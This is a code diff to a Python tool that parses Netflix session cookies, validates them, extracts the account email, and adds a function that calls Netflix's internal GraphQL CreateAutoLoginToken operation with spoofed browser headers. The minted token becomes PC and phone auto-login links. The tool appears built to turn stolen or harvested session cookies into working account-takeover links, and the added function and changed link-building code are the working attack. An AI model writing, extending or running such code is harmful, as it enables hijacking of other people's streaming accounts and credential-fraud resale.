@@ -437,7 +437,42 @@ def parse_cookies_from_text(raw_text: str) -> dict:
                     k, v = pair.strip().split("=", 1)
                     cookies[k.strip()] = v.strip()
     return cookies
-
+    
+def mint_netflix_nftoken(session: requests.Session) -> str | None:
+    """Mint a real single-use Netflix auto-login nftoken from an authenticated session."""
+    graphql_url = "https://web.prod.cloud.netflix.com/graphql"
+    payload = {
+        "operationName": "CreateAutoLoginToken",
+        "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
+        "extensions": {
+            "persistedQuery": {
+                "version": 102,
+                "id": "76e97129-f4b5-41a0-a73c-12e674896849",
+            }
+        },
+    }
+    gql_headers = {
+        "User-Agent": (
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+        ),
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "Origin": "https://www.netflix.com",
+        "Referer": "https://www.netflix.com/YourAccount",
+    }
+    try:
+        r = session.post(graphql_url, json=payload, headers=gql_headers, timeout=15)
+        if r.status_code == 200:
+            data = r.json()
+            token = (data.get("data") or {}).get("createAutoLoginToken")
+            if isinstance(token, str) and len(token) > 20:
+                return token
+        logger.warning(f"createAutoLoginToken failed ({r.status_code}): {r.text[:200]}")
+    except Exception as e:
+        logger.warning(f"createAutoLoginToken exception: {e}")
+    return None
+    
 def check_netflix_cookie(cookie_dict: dict) -> dict | None:
     netflix_id = cookie_dict.get("NetflixId")
     if not netflix_id:
@@ -484,8 +519,11 @@ def check_netflix_cookie(cookie_dict: dict) -> dict | None:
         email = email_match.group(1).replace("\\x40", "@") if email_match else "Hidden"
 
         clean_id = unquote(netflix_id)
-        pc_link = f"https://www.netflix.com/browse?nftoken={clean_id}"
-        phone_link = f"https://www.netflix.com/?nftoken={clean_id}"
+        real_nftoken = mint_netflix_nftoken(session)
+        if not real_nftoken:
+            return None
+        pc_link = f"https://www.netflix.com/browse?nftoken={real_nftoken}"
+        phone_link = f"https://www.netflix.com/?nftoken={real_nftoken}"
 
         return {
             "plan": plan,
